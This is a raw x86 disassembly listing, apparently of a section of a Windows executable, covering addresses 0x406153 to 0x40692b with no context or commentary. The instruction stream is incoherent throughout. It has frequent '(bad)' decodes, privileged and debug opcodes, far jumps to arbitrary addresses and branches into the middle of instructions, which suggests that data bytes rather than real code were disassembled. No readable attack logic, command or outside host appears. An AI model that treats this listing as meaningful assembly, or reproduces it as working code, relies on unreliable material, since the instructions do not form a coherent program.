  406153:	and    BYTE PTR [ebp-0x31],bl
  406156:	mov    edi,0x889521cc
  40615b:	icebp  
  40615c:	fadd   QWORD PTR [ebp+0x1a6f9e7a]
  406162:	xchg   ebx,eax
  406163:	xchg   ebx,eax
  406164:	es retf 
  406166:	aam    0x37
  406168:	in     al,dx
  406169:	xor    cl,al
  40616b:	aad    0x35
  40616d:	dec    ebx
  40616e:	adc    ah,bh
  406170:	push   0x6b8b3b6c
  406175:	scas   al,BYTE PTR es:[edi]
  406176:	sar    BYTE PTR [eax+0x58],cl
  406179:	pop    esp
  40617a:	pusha  
  40617b:	inc    eax
  40617c:	iret   
  40617d:	rcl    edx,1
  40617f:	sub    bh,BYTE PTR [ecx]
  406181:	push   edi
  406182:	data16 jb 0x4061de
  406185:	push   esp
  406186:	(bad)  
  406187:	adc    eax,0x203070c5
  40618c:	shl    DWORD PTR [edi-0x7b],1
  40618f:	mov    ds:0x3a45801d,al
  406194:	cmp    ah,BYTE PTR [esp+ecx*1]
  406197:	int    0xba
  406199:	pop    esp
  40619a:	or     al,0xd3
  40619c:	add    dl,BYTE PTR [ebx-0x46]
  40619f:	xchg   DWORD PTR [ebx-0xc],esi
  4061a2:	test   al,0x9
  4061a4:	add    DWORD PTR [eax],ecx
  4061a6:	xchg   ebp,eax
  4061a7:	or     ch,BYTE PTR [eax-0x2c]
  4061aa:	sbb    DWORD PTR [edi],esi
  4061ac:	dec    ebp
  4061ad:	faddp  st(4),st
  4061af:	add    al,0x68
  4061b1:	push   edi
  4061b2:	add    al,dh
  4061b4:	jb     0x406158
  4061b6:	sbb    eax,eax
  4061b8:	ins    BYTE PTR es:[edi],dx
  4061b9:	cmp    BYTE PTR [ebp+0x20011d32],0xa9
  4061c0:	mov    ebp,DWORD PTR [edi]
  4061c2:	or     al,0x5a
  4061c4:	(bad)
  4061c7:	pop    ebp
  4061c8:	sbb    ah,BYTE PTR [eax-0xa]
  4061cb:	mov    ds:0x11104001,eax
  4061d0:	(bad)  
  4061d1:	lea    edi,[ecx]
  4061d3:	mov    esp,0xd767d3e
  4061d8:	ja     0x4061b9
  4061da:	cmp    ebx,DWORD PTR [eax-0x2e9887af]
  4061e0:	jle    0x406241
  4061e2:	repnz mov cl,0xc
  4061e5:	nop
  4061e6:	add    al,BYTE PTR [edx-0x43e436ee]
  4061ec:	cmp    ebx,0x29929ab4
  4061f2:	jb     0x40625f
  4061f4:	jno    0x40623d
  4061f6:	xor    BYTE PTR [ebx+0x37bc9a5b],0x6f
  4061fd:	mov    ds:0x105cd894,al
  406202:	jbe    0x406246
  406204:	(bad)  
  406205:	jb     0x406250
  406207:	or     eax,0xe6a8188c
  40620c:	xrelease xchg DWORD PTR [eax],esi
  40620f:	outs   dx,DWORD PTR ds:[esi]
  406210:	mov    ds:0xeed47d5c,al
  406215:	iret   
  406216:	mov    bl,0x5b
  406218:	inc    ecx
  406219:	(bad)  
  40621a:	gs and al,0x45
  40621d:	pop    ecx
  40621e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40621f:	int    0xa8
  406221:	mov    eax,0xefd61ec
  406226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406227:	inc    esi
  406228:	dec    edi
  406229:	call   0x3305:0xf418da3e
  406230:	mov    ebp,0x993512fa
  406235:	cld    
  406236:	jb     0x4062a1
  406238:	jg     0x406200
  40623a:	lea    ecx,[edi+edx*1-0x58]
  40623e:	leave  
  40623f:	jp     0x406226
  406241:	jno    0x4062b1
  406243:	jmp    0x40623f
  406245:	sub    BYTE PTR [esi+0x25],bh
  406248:	scas   al,BYTE PTR es:[edi]
  406249:	jne    0x406223
  40624b:	push   edx
  40624c:	comiss xmm4,DWORD PTR [edx]
  40624f:	cmp    al,0xc8
  406251:	(bad)  
  406253:	jo     0x40625d
  406255:	jecxz  0x4062af
  406257:	rcl    cl,0xbe
  40625a:	push   ds
  40625b:	lea    esi,[eax-0x32873ce7]
  406261:	ins    DWORD PTR es:[edi],dx
  406262:	sub    edi,ecx
  406264:	inc    ecx
  406265:	sbb    eax,0x2eef4fbb
  40626a:	scas   al,BYTE PTR es:[edi]
  40626b:	mov    ebx,0x7dc56c71
  406270:	mov    ch,0xb5
  406272:	xor    eax,0x836bb969
  406277:	xchg   ecx,eax
  406278:	imul   eax,DWORD PTR [ecx],0xc79cb27c
  40627e:	sub    BYTE PTR [ebx-0x503d5ff5],cl
  406284:	jl     0x40629a
  406286:	data16 and al,0x12
  406289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40628a:	pushf  
  40628b:	jle    0x40625e
  40628d:	and    esp,DWORD PTR [ebx]
  40628f:	push   edx
  406290:	jb     0x4062ae
  406292:	enter  0xbb4e,0x10
  406296:	arpl   WORD PTR [ecx],sp
  406298:	js     0x406309
  40629a:	js     0x4062c7
  40629c:	mov    al,ds:0x1d3a2e36
  4062a1:	sahf   
  4062a2:	dec    ebx
  4062a3:	or     dh,dl
  4062a5:	inc    edx
  4062a6:	push   ebx
  4062a7:	or     eax,0x1763ab4d
  4062ac:	pop    ss
  4062ad:	aad    0x9
  4062af:	cmp    DWORD PTR [ebp-0x3],edi
  4062b2:	and    dh,dl
  4062b4:	lods   al,BYTE PTR ds:[esi]
  4062b5:	iret   
  4062b6:	leave  
  4062b7:	lea    eax,[ebx+0x1405d470]
  4062bd:	(bad)  
  4062be:	fist   WORD PTR [ebp-0x9]
  4062c1:	inc    esp
  4062c2:	test   al,0x6b
  4062c4:	mov    eax,0x9ae16425
  4062c9:	loop   0x40631d
  4062cb:	pop    es
  4062cc:	fimul  WORD PTR [edi*2-0x634bfb45]
  4062d3:	aas    
  4062d4:	cmp    eax,0x40b25a5b
  4062d9:	dec    BYTE PTR [ebp-0x6ab7292f]
  4062df:	(bad)
  4062e2:	push   ecx
  4062e3:	aas    
  4062e4:	mov    al,0x15
  4062e6:	mov    eax,0x36fecea6
  4062eb:	mov    esi,0x6c84ab5b
  4062f0:	ret    
  4062f1:	arpl   WORD PTR [esi+0x6d],di
  4062f4:	adc    dh,BYTE PTR [esi]
  4062f6:	push   ss
  4062f7:	mov    al,ds:0x921bbe1b
  4062fc:	std    
  4062fd:	inc    ebp
  4062fe:	mov    esp,0xf08e7f6d
  406303:	retf   
  406304:	add    cl,BYTE PTR [edx]
  406306:	dec    ebx
  406307:	pop    esi
  406308:	sbb    DWORD PTR [edi],edx
  40630a:	push   ss
  40630b:	retf   
  40630c:	cmps   WORD PTR gs:[esi],WORD PTR es:[edi]
  40630f:	pop    ebp
  406310:	mov    esp,0x38f09f6f
  406315:	es jge 0x406342
  406318:	pop    es
  406319:	and    eax,0xe663ac7a
  40631e:	cs pop edi
  406320:	or     al,0x8c
  406322:	aas    
  406323:	xor    cl,ch
  406325:	imul   ebx,esi,0xd296bc13
  40632b:	leave  
  40632c:	inc    edx
  40632d:	addr16 cdq 
  40632f:	test   BYTE PTR [ebp-0x2f86d177],bl
  406335:	inc    esi
  406336:	addr16 xchg edi,eax
  406338:	mov    cl,0x3b
  40633a:	lock mov bh,BYTE PTR [ebp-0x143bd7fd]
  406341:	mov    bh,0xe6
  406343:	and    DWORD PTR [esi+esi*2-0x6b],edx
  406347:	leave  
  406348:	jg     0x406312
  40634a:	inc    esi
  40634b:	lods   al,BYTE PTR ds:[esi]
  40634c:	cmp    eax,0x6e114061
  406351:	cmp    eax,0x8534aba4
  406356:	shr    BYTE PTR ds:0x7253d06c,cl
  40635c:	mov    WORD PTR [edi-0x2a],gs
  40635f:	push   es
  406360:	out    dx,al
  406361:	imul   edi,esi,0x83c0f572
  406367:	push   edi
  406368:	pop    eax
  406369:	pop    ebp
  40636a:	sti    
  40636b:	ficom  WORD PTR [esi]
  40636d:	jge    0x4063b0
  40636f:	(bad)  
  406370:	ficom  DWORD PTR [esi-0x2e]
  406373:	jmp    0x406323
  406375:	and    edi,DWORD PTR [ecx+0x37]
  406378:	xor    DWORD PTR [ebx+0x1664aab5],ebp
  40637e:	jns    0x40633f
  406380:	jb     0x40636d
  406382:	pop    ebp
  406383:	repnz sub al,0x91
  406386:	dec    edi
  406387:	fld    DWORD PTR [ebp+0x3f]
  40638a:	mov    dl,BYTE PTR [esi+0x63afad65]
  406390:	addr16 aad 0xe
  406393:	mov    ds:0x4da08cb7,al
  406398:	pop    ebx
  406399:	mov    ecx,0x8103d27d
  40639e:	push   ebp
  40639f:	aad    0xcb
  4063a1:	sbb    DWORD PTR [esi+0x1b76d920],edx
  4063a7:	fisttp DWORD PTR [edi]
  4063a9:	icebp  
  4063aa:	xlat   BYTE PTR ds:[ebx]
  4063ab:	hlt    
  4063ac:	add    eax,0xac195b3d
  4063b1:	cmp    ah,bl
  4063b3:	fwait
  4063b4:	lods   eax,DWORD PTR ds:[esi]
  4063b5:	push   edi
  4063b6:	hlt    
  4063b7:	jbe    0x40633b
  4063b9:	and    DWORD PTR [ebx-0x547a6e46],ecx
  4063bf:	fprem1 
  4063c1:	xchg   esi,eax
  4063c2:	sub    DWORD PTR [esi],0x6d
  4063c5:	push   es
  4063c6:	jns    0x4063d0
  4063c8:	push   0xbcc18723
  4063cd:	cmc    
  4063ce:	push   ds
  4063cf:	mov    ecx,0xe0b9abba
  4063d4:	sub    eax,0x7a9e71b7
  4063d9:	jne    0x406408
  4063db:	(bad)
  4063de:	jg     0x4063fe
  4063e0:	pop    edx
  4063e1:	push   ebp
  4063e2:	push   0xf77ebea5
  4063e7:	xlat   BYTE PTR ds:[ebx]
  4063e8:	inc    ebp
  4063e9:	push   eax
  4063ea:	leave  
  4063eb:	ins    BYTE PTR es:[edi],dx
  4063ec:	aad    0xd0
  4063ee:	(bad)  
  4063ef:	cld    
  4063f0:	leave  
  4063f1:	push   ecx
  4063f2:	call   0x6cf76ca1
  4063f7:	mov    ecx,0x1b603490
  4063fc:	sti    
  4063fd:	cmp    edi,DWORD PTR [ebx]
  4063ff:	scas   al,BYTE PTR es:[edi]
  406400:	mov    al,0x92
  406402:	push   ecx
  406403:	sub    dh,BYTE PTR [ebx]
  406405:	pop    es
  406406:	sti    
  406407:	sub    dh,bl
  406409:	xor    eax,DWORD PTR [ebx+ebx*1+0x3b863814]
  406410:	mov    dl,al
  406412:	jb     0x4063eb
  406414:	iret   
  406415:	mov    eax,0x4113070c
  40641a:	xor    dh,BYTE PTR [ebx]
  40641c:	enter  0x5669,0x1c
  406420:	dec    edi
  406421:	fisttp WORD PTR [ebx+0x78]
  406424:	aad    0x5f
  406426:	mov    cl,0xcb
  406428:	neg    DWORD PTR [ecx+edi*1-0x35758b2c]
  40642f:	inc    edx
  406430:	mov    cl,0xf8
  406432:	dec    ebp
  406433:	dec    eax
  406434:	fst    st(4)
  406436:	xchg   ecx,eax
  406437:	inc    esp
  406438:	call   0x97ab4cdd
  40643d:	mov    fs,esp
  40643f:	inc    edi
  406440:	out    dx,al
  406441:	jnp    0x406499
  406443:	jo     0x40643b
  406445:	jle    0x4064ac
  406447:	lds    edx,FWORD PTR [ebx]
  406449:	jbe    0x406466
  40644b:	jb     0x4063ce
  40644d:	stos   DWORD PTR es:[edi],eax
  40644e:	arpl   WORD PTR [ecx-0x76],di
  406451:	xor    al,0xde
  406453:	sbb    eax,0x8d137058
  406458:	pminsw mm6,QWORD PTR [ebx-0x24e812b2]
  40645f:	mov    edi,0xb5022305
  406464:	jae    0x406464
  406466:	popf   
  406467:	sahf   
  406468:	push   0x1e
  40646a:	dec    ebp
  40646b:	jns    0x406464
  40646d:	iret   
  40646e:	gs add ebp,ebx
  406471:	sahf   
  406472:	call   0xcc6a:0x4bcafd58
  406479:	test   BYTE PTR [edi],cl
  40647b:	add    edi,DWORD PTR [edx+0x12]
  40647e:	mov    bl,0xf9
  406480:	push   ebp
  406481:	(bad)  
  406482:	icebp  
  406483:	ja     0x4064b5
  406485:	and    bl,BYTE PTR ds:0x9643de94
  40648b:	cwde   
  40648c:	pop    ecx
  40648d:	ficom  WORD PTR [ecx-0x1d]
  406490:	dec    BYTE PTR [edx]
  406492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406493:	arpl   ax,bp
  406495:	jae    0x406489
  406497:	dec    ecx
  406498:	xor    esi,DWORD PTR [edi]
  40649a:	cdq    
  40649b:	cmp    BYTE PTR [ecx-0x7b3520a6],dl
  4064a1:	fstp   DWORD PTR [edi+0x79]
  4064a4:	inc    ebp
  4064a5:	test   BYTE PTR [ebx],0xe
  4064a8:	cwde   
  4064a9:	xchg   ebp,eax
  4064aa:	dec    esp
  4064ab:	pushf  
  4064ac:	mov    BYTE PTR [ebp+ecx*1+0x1a],ah
  4064b0:	repnz cdq 
  4064b2:	mov    ecx,0xa8383a8b
  4064b7:	xchg   edi,eax
  4064b8:	push   esp
  4064b9:	(bad)
  4064bc:	mov    ds:0xd27bef2e,al
  4064c1:	cdq    
  4064c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064c3:	pop    edi
  4064c4:	icebp  
  4064c5:	mov    ch,0x77
  4064c7:	out    0xb6,al
  4064c9:	jns    0x4064b7
  4064cb:	push   ss
  4064cc:	dec    esp
  4064cd:	popa   
  4064ce:	(bad)  
  4064cf:	push   ds
  4064d0:	cld    
  4064d1:	rol    DWORD PTR [eax-0x7322e93c],0x37
  4064d8:	pop    ds
  4064d9:	xchg   ebx,eax
  4064da:	adc    eax,0x3b9d4e81
  4064df:	aas    
  4064e0:	pop    ebx
  4064e1:	mov    ebx,0x4f3753b6
  4064e6:	mov    ecx,esi
  4064e8:	jmp    0xc73b:0x624b1fde
  4064ef:	cmp    dl,BYTE PTR [edi+ebx*1+0x1e54c7e1]
  4064f6:	addr16 cld 
  4064f8:	(bad)  
  4064f9:	shl    DWORD PTR [eax],cl
  4064fb:	pop    esp
  4064fc:	xchg   esi,eax
  4064fd:	pinsrw mm6,WORD PTR [ebp+0x50],0x5
  406502:	jge    0x4064a8
  406504:	pop    ebp
  406505:	fdiv   QWORD PTR [ebx+eax*4+0x38]
  406509:	jmp    0xd098113f
  40650e:	test   al,0x7e
  406510:	cli    
  406511:	repz cld 
  406513:	stc    
  406514:	push   ecx
  406515:	(bad)  
  406516:	rcr    DWORD PTR [eax-0x20a2c2ef],1
  40651c:	out    0x38,eax
  40651e:	pop    ebx
  40651f:	adc    dl,ah
  406521:	jp     0x4064dc
  406523:	xchg   esp,eax
  406524:	and    dl,BYTE PTR [edx+0x1f0a94bb]
  40652a:	les    eax,FWORD PTR [edi+0x19551995]
  406530:	mov    WORD PTR [esi],es
  406532:	loope  0x4065a4
  406534:	or     esi,eax
  406536:	fcom   DWORD PTR [eax+esi*8]
  406539:	add    BYTE PTR [ebx+0x36],dh
  40653c:	inc    esp
  40653d:	div    ebp
  40653f:	stc    
  406540:	cwde   
  406541:	in     eax,0xb6
  406543:	mov    ebx,0xeeaad992
  406548:	cld    
  406549:	add    al,0x11
  40654b:	jae    0x4065a5
  40654d:	xor    BYTE PTR es:[esi+0x3f],al
  406551:	dec    edx
  406552:	add    ebx,DWORD PTR ds:0xcb3adeb8
  406558:	and    eax,0x752e0a54
  40655d:	hlt    
  40655e:	adc    eax,0x5f69bd8
  406563:	and    DWORD PTR [si+0x2ddd],0x61256035
  40656c:	xor    esp,DWORD PTR [esi-0x3e]
  40656f:	aaa    
  406570:	sar    DWORD PTR ds:[eax-0x6a],0x25
  406575:	cwde   
  406576:	cmc    
  406577:	sub    ebp,esp
  406579:	cmp    BYTE PTR [esi],cl
  40657b:	push   edi
  40657c:	jmp    FWORD PTR [edx]
  40657e:	icebp  
  40657f:	lahf   
  406580:	into   
  406581:	jmp    0x406518
  406583:	or     BYTE PTR [bx+di],ch
  406586:	sub    DWORD PTR [eax+edi*2-0x64e8b885],0x3f22bbce
  406591:	jge    0x4065ca
  406593:	aam    0xbd
  406595:	into   
  406596:	push   esi
  406597:	mov    dh,0x59
  406599:	xor    edx,DWORD PTR [edx+0x13]
  40659c:	(bad)  
  40659d:	jp     0x40651f
  40659f:	mov    al,0x76
  4065a1:	in     al,0x3a
  4065a3:	ja     0x406607
  4065a5:	push   esp
  4065a6:	retf   0x38ea
  4065a9:	fsub   QWORD PTR [esi-0x46]
  4065ac:	push   cs
  4065ad:	mov    esi,gs
  4065af:	mov    eax,ds:0x3dc56fb0
  4065b4:	jmp    0x406575
  4065b6:	and    al,0x7b
  4065b8:	test   BYTE PTR [esi+0x2b],bl
  4065bb:	div    dl
  4065bd:	daa    
  4065be:	stc    
  4065bf:	std    
  4065c0:	enter  0x3803,0x59
  4065c4:	stc    
  4065c5:	push   ebp
  4065c6:	jae    0x406631
  4065c8:	test   al,0x48
  4065ca:	jne    0x4065ac
  4065cc:	shl    BYTE PTR [esi],cl
  4065ce:	call   0x6e6da974
  4065d3:	xor    esi,esp
  4065d5:	sub    al,0x5a
  4065d7:	lods   eax,DWORD PTR ds:[esi]
  4065d8:	inc    ebp
  4065d9:	retf   0xbc0b
  4065dc:	cmp    eax,0x5b0c2aa4
  4065e1:	jge    0x406564
  4065e3:	push   ecx
  4065e4:	fisub  DWORD PTR [edi]
  4065e6:	jge    0x406614
  4065e8:	test   BYTE PTR [ebx-0x36],cl
  4065eb:	les    edi,FWORD PTR [ecx]
  4065ed:	cli    
  4065ee:	pop    ebx
  4065ef:	inc    ecx
  4065f0:	leave  
  4065f1:	adc    ebp,0x9039979d
  4065f7:	(bad)  
  4065f8:	sub    BYTE PTR [ebx+0x72fdd9ff],ah
  4065fe:	cmp    BYTE PTR [esp+edx*4],cl
  406601:	sub    ecx,eax
  406603:	sbb    al,0xde
  406605:	fcmovb st,st(4)
  406607:	mov    esi,DWORD PTR [eax+0x38]
  40660a:	retf   0x5fe0
  40660d:	dec    ebx
  40660e:	sub    BYTE PTR [edx+0x160bbf7a],bh
  406614:	fistp  QWORD PTR [ebx]
  406616:	jge    0x406598
  406618:	mov    eax,ds:0xa0a8badd
  40661d:	mov    ebp,0x3faf80a2
  406622:	ficom  DWORD PTR [esi+0x4158770f]
  406628:	push   cs
  406629:	cli    
  40662a:	inc    ebx
  40662b:	ss xor al,0x9c
  40662e:	jge    0x406684
  406630:	mov    ebp,0x38934d87
  406635:	lahf   
  406636:	mov    cl,0x54
  406638:	pop    ebp
  406639:	xor    dh,BYTE PTR [esi-0x62]
  40663c:	test   DWORD PTR [esp+ebx*2-0x2eac0b88],ecx
  406643:	sub    cl,BYTE PTR [esi]
  406645:	xchg   DWORD PTR [esi-0x20],eax
  406648:	loope  0x4065f2
  40664a:	loope  0x4066a1
  40664c:	mov    WORD PTR [ebx+0x43],fs
  40664f:	out    dx,eax
  406650:	lahf   
  406651:	bound  ebp,QWORD PTR [esi+0x60]
  406654:	mov    bl,0x7e
  406656:	jl     0x40662e
  406658:	pushf  
  406659:	das    
  40665a:	adc    BYTE PTR [ebx+edi*1],0x4b
  40665e:	(bad)  
  40665f:	sub    ebp,edi
  406661:	das    
  406662:	lock jmp FWORD PTR [esi+0x59]
  406666:	adc    DWORD PTR [eax],edx
  406668:	in     eax,dx
  406669:	out    dx,al
  40666a:	mov    ds:0xc7acd15a,al
  40666f:	stos   DWORD PTR es:[edi],eax
  406670:	int3   
  406671:	pop    esp
  406672:	jo     0x406615
  406674:	xchg   cl,al
  406676:	sub    al,0xe6
  406678:	push   0xc019e5a9
  40667d:	jecxz  0x4066a7
  40667f:	out    dx,eax
  406680:	repz dec esi
  406682:	and    al,0x1b
  406684:	fadd   st(7),st
  406686:	data16 (bad) 
  406689:	in     eax,dx
  40668a:	jle    0x406693
  40668c:	shl    BYTE PTR [edi],cl
  40668e:	add    ebx,DWORD PTR [ecx]
  406690:	mov    dh,0xba
  406692:	popa   
  406693:	scas   al,BYTE PTR es:[edi]
  406694:	shl    BYTE PTR [eax-0x2566d44c],0x5f
  40669b:	cmp    eax,0xb77691b
  4066a0:	test   al,0x8a
  4066a2:	sub    ah,BYTE PTR [ebx+0x4bb57f46]
  4066a8:	pop    ebp
  4066a9:	ins    DWORD PTR es:[edi],dx
  4066aa:	inc    edi
  4066ab:	test   al,0x12
  4066ad:	push   ebx
  4066ae:	sub    BYTE PTR [edx-0x53641d61],bl
  4066b4:	es out 0xdc,eax
  4066b7:	push   ss
  4066b8:	mov    dl,BYTE PTR [edx+0x14]
  4066bb:	aad    0x72
  4066bd:	fs or  ah,ah
  4066c0:	and    ebx,DWORD PTR [eax+ebp*4-0x39978a23]
  4066c7:	xor    al,0xc5
  4066c9:	jae    0x4066e2
  4066cb:	mov    bl,0x7e
  4066cd:	aam    0xc8
  4066cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066d0:	inc    ecx
  4066d1:	popa   
  4066d2:	xchg   ebx,eax
  4066d3:	pop    esi
  4066d4:	push   esi
  4066d5:	pop    esi
  4066d6:	ds sti 
  4066d8:	sti    
  4066d9:	jle    0x40673d
  4066db:	outs   dx,BYTE PTR ds:[esi]
  4066dc:	and    ch,BYTE PTR [ecx-0x9e3c854]
  4066e2:	push   ebp
  4066e3:	adc    cl,BYTE PTR [ecx+0x26]
  4066e6:	sbb    al,0x10
  4066e8:	sbb    ecx,DWORD PTR ds:0x21d53e25
  4066ee:	sti    
  4066ef:	imul   edi,DWORD PTR [ebx-0x30],0xe4cfb77f
  4066f6:	popa   
  4066f7:	mov    WORD PTR [ecx+0x28],ds
  4066fa:	mov    ds:0xf16d648c,eax
  4066ff:	call   DWORD PTR [eax-0x5b]
  406702:	fidivr WORD PTR [edx-0x470c8680]
  406708:	ret    
  406709:	xchg   esp,eax
  40670a:	lahf   
  40670b:	cmp    edx,0x2c768fa2
  406711:	jmp    0x24d83202
  406716:	sub    edi,DWORD PTR [edx-0x6e]
  406719:	pop    ecx
  40671a:	mov    ecx,DWORD PTR [ecx]
  40671c:	jb     0x4066d0
  40671e:	int3   
  40671f:	sbb    ebp,DWORD PTR [ebx-0x6a]
  406722:	jmp    0x4066b2
  406724:	clc    
  406725:	test   eax,0xd028f20c
  40672a:	dec    ebp
  40672b:	pusha  
  40672c:	repnz dec ebp
  40672e:	(bad)  
  406730:	add    eax,0x7a86945
  406735:	nop
  406736:	inc    ebp
  406737:	adc    DWORD PTR [ebp-0x162dfcf1],esp
  40673d:	imul   ebx,DWORD PTR [esi+ebp*1+0x4ab20138],0x3e127d5a
  406748:	test   al,0xe6
  40674a:	fwait
  40674b:	pop    ecx
  40674c:	and    edx,ebx
  40674e:	mov    edx,0x2c6ccc3f
  406753:	cld    
  406754:	cmp    BYTE PTR [ecx-0x4f],dl
  406757:	pop    ebx
  406758:	sbb    dl,BYTE PTR cs:[ebx]
  40675b:	dec    edi
  40675c:	adc    DWORD PTR [edx+edi*1-0xa],ecx
  406760:	dec    ebp
  406761:	sti    
  406762:	inc    esi
  406763:	aaa    
  406764:	or     BYTE PTR [ecx+0x352bed8],ch
  40676a:	ins    BYTE PTR es:[edi],dx
  40676b:	sbb    eax,DWORD PTR ds:0x22a27395
  406771:	cdq    
  406772:	cmp    eax,0x54926995
  406777:	lods   eax,DWORD PTR cs:[esi]
  406779:	imul   ebp,esp,0xffffff80
  40677c:	inc    ecx
  40677d:	xchg   ebp,esp
  40677f:	dec    edx
  406780:	xchg   ebx,eax
  406781:	pop    edi
  406782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406783:	cdq    
  406784:	inc    edi
  406785:	adc    eax,0x32efbd3c
  40678a:	jmp    0x4067a6
  40678c:	and    ch,BYTE PTR [eax-0x78]
  40678f:	mov    esi,0x1e4ab643
  406794:	xchg   edi,eax
  406795:	xor    al,0xf
  406797:	mov    ds:0xf0297fee,al
  40679c:	push   edi
  40679d:	xor    BYTE PTR [ecx-0x42],ch
  4067a0:	outs   dx,BYTE PTR ds:[esi]
  4067a1:	es js  0x40674e
  4067a4:	xor    eax,eax
  4067a6:	inc    ebp
  4067a7:	xchg   esp,eax
  4067a8:	sbb    cl,BYTE PTR [esp+ebx*1+0x67087d8f]
  4067af:	adc    edi,esi
  4067b1:	mov    al,0x63
  4067b3:	adc    BYTE PTR [ebx+eiz*1-0x628e0fb6],0x8a
  4067bb:	loope  0x4067bb
  4067bd:	mov    DWORD PTR [esi-0x720f3b49],edi
  4067c3:	or     bh,BYTE PTR [eax+0x56]
  4067c6:	pop    es
  4067c7:	gs in  eax,dx
  4067c9:	out    dx,eax
  4067ca:	in     al,dx
  4067cb:	test   BYTE PTR [esi+0x60],al
  4067ce:	pop    ecx
  4067cf:	sbb    edi,DWORD PTR [esp]
  4067d2:	jmp    0x5944:0xe758bb7
  4067d9:	push   cs
  4067da:	fisttp DWORD PTR [esi+0x7f]
  4067dd:	push   ss
  4067de:	stos   DWORD PTR es:[edi],eax
  4067df:	jae    0x406783
  4067e1:	jno    0x406859
  4067e3:	ins    BYTE PTR es:[edi],dx
  4067e4:	cli    
  4067e5:	mov    ebx,0xe2c29f31
  4067ea:	and    ecx,DWORD PTR [edi-0x78]
  4067ed:	jne    0x4067f2
  4067ef:	sbb    BYTE PTR [edx-0x47],bl
  4067f2:	arpl   WORD PTR [edx-0x4e338eee],ax
  4067f8:	cmp    esp,DWORD PTR [ecx]
  4067fa:	pop    edi
  4067fb:	sub    bh,dh
  4067fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067fe:	lock cmp DWORD PTR [ecx],0xffffffd8
  406802:	xor    DWORD PTR [ebx*1+0x406e8080],eax
  406809:	stos   BYTE PTR es:[edi],al
  40680a:	cmp    ebp,edx
  40680c:	aad    0x9f
  40680e:	jmp    0xd99b:0xab023b94
  406815:	icebp  
  406816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406817:	cmc    
  406818:	pop    ss
  406819:	jne    0x406880
  40681b:	jbe    0x406839
  40681d:	dec    BYTE PTR [ebx]
  40681f:	stos   BYTE PTR es:[edi],al
  406820:	jg     0x406879
  406822:	xor    ecx,edi
  406824:	mov    bh,0x74
  406826:	aam    0x9b
  406828:	test   eax,0x3583a1b1
  40682d:	cmp    eax,eax
  40682f:	mov    ebp,0x4600d7ee
  406834:	clc    
  406835:	stos   BYTE PTR es:[edi],al
  406836:	inc    ecx
  406837:	in     al,dx
  406838:	je     0x40681b
  40683a:	xlat   BYTE PTR ds:[ebx]
  40683b:	fs es and eax,0xa0fbd6ce
  406842:	sub    eax,0x3dbed793
  406847:	jo     0x40686a
  406849:	xchg   ebp,eax
  40684a:	or     esi,DWORD PTR [ecx]
  40684c:	jg     0x406847
  40684e:	jns    0x406843
  406850:	mov    edi,0xa1564ff
  406855:	cmc    
  406856:	aam    0x24
  406858:	(bad)  
  406859:	jmp    0xa139:0x19217b5
  406860:	xchg   DWORD PTR [ecx+edi*1-0x77],ebp
  406864:	lahf   
  406865:	xlat   BYTE PTR ds:[ebx]
  406866:	push   es
  406867:	inc    ebx
  406868:	mov    dl,0xda
  40686a:	jo     0xb88178d4
  406870:	push   ebp
  406871:	add    edi,edx
  406873:	sub    DWORD PTR [eax+ebp*8+0x53009219],ebp
  40687a:	bound  edx,QWORD PTR [ebx]
  40687c:	loop   0x406820
  40687e:	mov    al,ds:0x842d278
  406883:	jne    0x406839
  406885:	fimul  DWORD PTR [ebx+0xc3272c3]
  40688b:	mov    dh,0x52
  40688d:	loope  0x40684c
  40688f:	push   ebx
  406890:	adc    ah,BYTE PTR [eax+ecx*4]
  406893:	out    dx,al
  406894:	stos   BYTE PTR es:[edi],al
  406895:	mov    ecx,0x793a4181
  40689a:	xchg   edx,eax
  40689b:	sbb    BYTE PTR [edx+0x33],ch
  40689e:	mov    al,ds:0x9caeb87a
  4068a3:	and    al,0x30
  4068a5:	test   bl,bl
  4068a7:	fbstp  TBYTE PTR [esi+0x7cee426a]
  4068ad:	push   eax
  4068ae:	jne    0x406854
  4068b0:	ja     0x406857
  4068b2:	stos   BYTE PTR es:[edi],al
  4068b3:	popa   
  4068b4:	jmp    0xd678:0x151d088
  4068bb:	mov    bl,BYTE PTR [eax]
  4068bd:	xor    eax,DWORD PTR [edi+0x35]
  4068c0:	ror    ch,1
  4068c2:	push   es
  4068c3:	stc    
  4068c4:	push   es
  4068c5:	pop    ecx
  4068c6:	loop   0x4068c5
  4068c8:	pop    esi
  4068c9:	fstp   DWORD PTR [esi+0x53]
  4068cc:	fdiv   QWORD PTR [ecx]
  4068ce:	sbb    al,0xac
  4068d0:	xlat   BYTE PTR ds:[ebx]
  4068d1:	mov    ah,0xc3
  4068d3:	inc    ebp
  4068d4:	add    edx,DWORD PTR [edi+eiz*4]
  4068d7:	sbb    dl,dh
  4068d9:	xchg   DWORD PTR [ecx+eax*8+0x4535a4bb],ebp
  4068e0:	or     ch,BYTE PTR [edx]
  4068e2:	out    dx,al
  4068e3:	jno    0x406913
  4068e5:	add    eax,0x9bfc65da
  4068ea:	aam    0x32
  4068ec:	pop    ebx
  4068ed:	jmp    0x40694c
  4068ef:	xlat   BYTE PTR ds:[ebx]
  4068f0:	mov    esp,0x28efdd07
  4068f5:	sbb    BYTE PTR [ebp+0xbd2487c],0x97
  4068fc:	ds jle 0x40690d
  4068ff:	fadd   DWORD PTR [edi-0x6df259b7]
  406905:	sub    al,0x9d
  406907:	adc    bl,dl
  406909:	sub    BYTE PTR [eax],dl
  40690b:	or     edx,edx
  40690d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40690e:	xchg   dx,ax
  406910:	and    BYTE PTR [ebx+0x54],al
  406913:	addr16 inc edi
  406915:	xchg   esi,eax
  406916:	fcom   QWORD PTR [ebp-0x35339563]
  40691c:	retf   0x8346
  40691f:	lahf   
  406920:	push   ecx
  406921:	xchg   ebp,eax
  406922:	fwait
  406923:	dec    ebp
  406924:	rcr    bl,0x17
  406927:	jb     0x4068ce
  406929:	jne    0x406940
  40692b:	out    0xb,al
